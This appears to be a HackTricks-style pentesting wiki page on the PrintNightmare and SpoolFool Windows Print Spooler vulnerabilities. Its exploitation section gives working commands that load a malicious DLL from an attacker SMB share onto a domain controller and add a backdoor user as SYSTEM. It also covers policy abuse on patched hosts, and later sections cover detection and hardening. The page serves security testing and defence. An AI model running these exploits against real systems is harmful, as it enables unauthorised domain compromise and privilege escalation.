# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare is the collective name given to a family of vulnerabilities in the Windows **Print Spooler** service that allow **arbitrary code execution as SYSTEM** and, when the spooler is reachable over RPC, **remote code execution (RCE) on domain controllers and file servers**. The most-widely exploited CVEs are **CVE-2021-1675** (initially classed as LPE) and **CVE-2021-34527** (full RCE). Subsequent issues such as **CVE-2021-34481 (“Point & Print”)** and **CVE-2022-21999 (“SpoolFool”)** prove that the attack surface is still far from closed.

If you are looking for **authentication coercion / relay** via the spooler rather than **driver-based RCE/LPE**, check [this other page about printer coercion abuse](printers-spooler-service-abuse.md). This page is focused on **loading drivers / DLLs as SYSTEM**.

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Patched in June 2021 CU but bypassed by CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` allows authenticated users to load a driver DLL from a remote share; post-August 2021 this usually requires weakened Point & Print policies|
|2021|CVE-2021-34481|“Point & Print”|LPE|Unsigned driver installation by non-admin users|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrary directory creation → DLL planting – works after 2021 patches|

All of them abuse one of the **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) or trust relationships inside **Point & Print**.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

An authenticated but **non-privileged** domain user can run arbitrary DLLs as **NT AUTHORITY\SYSTEM** on a remote spooler (often the DC) by:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Popular PoCs include **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) and Benjamin Delpy’s `misc::printnightmare / lsa::addsid` modules in **mimikatz**.

### 2.2 Local privilege escalation (any supported Windows, 2021-2024)

The same API can be called **locally** to load a driver from `C:\Windows\System32\spool\drivers\x64\3\` and achieve SYSTEM privileges:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Modern triage on patched hosts

On a fully updated host, public PrintNightmare PoCs often fail because Windows now defaults to **administrator-only** printer driver installation (`RestrictDriverInstallationToAdministrators=1` since August 10, 2021). Before throwing an exploit at a target, first check whether the environment rolled that safety change back for legacy printer deployments:

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

The two most interesting weak values are usually:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

From Linux, quickly confirm that the target exposes the relevant print RPC interfaces before running a PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Some newer public tooling also gives you a safer **check/list** workflow before sending a DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> If you get `RPC_E_ACCESS_DENIED` (`0x8001011b`) as a low-privileged user, you are usually seeing the post-2021 default rather than a transport failure.

> On Windows 11 22H2+ and newer client builds, remote printing defaults to **RPC over TCP** and **RPC over named pipes** (`\PIPE\spoolss`) is disabled unless explicitly re-enabled. Some older PoCs and lab notes still assume the named pipe is reachable.

### 2.4 Package Point & Print abuse on “patched” networks

Many enterprise environments stayed **vulnerable by policy** after the original 2021 patches because helpdesk or print-server workflows still required non-admin users to install/update drivers. In practice, the offensive playbook becomes:

- If security prompts are fully disabled, **classic arbitrary-DLL PrintNightmare** is still the shortest path.
- If `Only use Package Point and Print` is enabled, you usually need to pivot to a **signed package-aware driver** path rather than a raw DLL drop.
- 2024 research showed that **`Package Point and Print - Approved servers` is not a hard trust boundary by itself**: if an attacker can spoof or hijack name resolution for one approved print server, victims can still be redirected to a malicious server that satisfies policy checks.
- Even combining UNC hardening with forced RPC-over-SMB can be brittle because modern clients may **fall back to RPC over TCP**.

This is why modern PrintNightmare-style exploitation is often more about **abusing enterprise printer deployment policy** than replaying the original 2021 PoC unchanged.

### 2.5 SpoolFool (CVE-2022-21999) – bypassing 2021 fixes

Microsoft’s 2021 patches blocked remote driver loading but **did not harden directory permissions**. SpoolFool abuses the `SpoolDirectory` parameter to create an arbitrary directory under `C:\Windows\System32\spool\drivers\`, drops a payload DLL, and forces the spooler to load it:

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> The exploit works on fully-patched Windows 7 → Windows 11 and Server 2012R2 → 2022 before February 2022 updates 

---

## 3. Detection & hunting

* **PrintService logs** – enable the *Microsoft-Windows-PrintService/Operational* channel and watch for **Event ID 316** (driver added/updated, usually includes the DLL names) on both successful and failed attempts. Pair it with **Event ID 808/811** for suspicious spooler module/driver load failures.
* **Sysmon** – `Event ID 7` (Image loaded) or `11/23` (File write/delete) inside `C:\Windows\System32\spool\drivers\*` when the parent process is **spoolsv.exe**.
* **Process lineage** – alert whenever **spoolsv.exe** spawns `cmd.exe`, `rundll32.exe`, PowerShell, or any unexpected unsigned child process.
* **Network telemetry** – unexpected SMB fetches from `spoolsv.exe` to attacker-controlled shares or unusual printer RPC traffic from servers that should not behave as print servers are both high-signal leads.

## 4. Mitigation & hardening

1. **Patch!** – Apply the latest cumulative update on every Windows host that has the Print Spooler service installed.
2. **Disable the spooler where it is not required**, especially on Domain Controllers:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Block remote connections** while still allowing local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Keep Point & Print admin-only** by setting:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Detailed guidance in Microsoft KB5005652 
5. If business requirements force `RestrictDriverInstallationToAdministrators=0`, treat every other printer policy as a **partial mitigation only**. At minimum, prefer **package-aware drivers**, enable **Only use Package Point and Print**, and restrict **Package Point and Print - Approved servers** to explicit in-forest print servers.
6. **Do not roll back printer RPC privacy** just to fix broken printer mappings. Environments that set `RpcAuthnLevelPrivacyEnabled=0` are undoing hardening added for **CVE-2021-1678** and usually deserve extra scrutiny during an engagement.

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules  
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standard Impacket implementation with `-check`, `-list`, and `-delete` modes  
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper with built-in SMB delivery, multi-target support, and both `MS-RPRN` / `MS-PAR` modes  
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)  
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – bring-your-own-vulnerable-printer-driver abuse through package Point & Print  
* SpoolFool exploit & write-up  
* 0patch micropatches for SpoolFool and other spooler bugs  

If you want to **coerce authentication** via the spooler instead of loading a driver, jump to [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*  
  <https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*  
  <https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*  
  <https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*  
  <https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
